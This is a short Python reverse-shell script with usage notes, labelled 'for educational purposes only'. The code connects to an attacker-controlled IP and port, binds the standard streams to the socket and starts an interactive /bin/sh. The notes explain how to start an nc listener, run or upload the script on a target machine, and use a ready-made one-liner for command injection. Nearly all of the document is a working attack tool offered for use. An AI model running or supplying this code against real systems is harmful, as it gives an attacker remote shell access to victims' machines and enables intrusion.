#!/usr/bin/env python3
# Simple Python Reverse Shell
# For educational purposes only

import socket
import subprocess
import os

# CHANGE THESE VALUES
ATTACKER_IP = '127.0.0.1'  # Change to your IP
ATTACKER_PORT = 4444        # Change to your listening port

# Create socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    # Connect to attacker machine
    s.connect((ATTACKER_IP, ATTACKER_PORT))
    s.send(b'Connected to Python reverse shell\n')
    
    # Redirect stdin, stdout, and stderr
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    
    # Execute shell
    subprocess.call(['/bin/sh', '-i'])
except Exception as e:
    # Error handling
    print(f"Error: {str(e)}")
finally:
    # Clean up
    s.close()

'''
USAGE:
1. On your attacker machine, start a listener:
   nc -lvnp 4444

2. Run this script on the target machine (or upload and execute it)

3. You should receive a shell connection back to your machine

This can be converted to a one-liner for use in command injection:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
''' 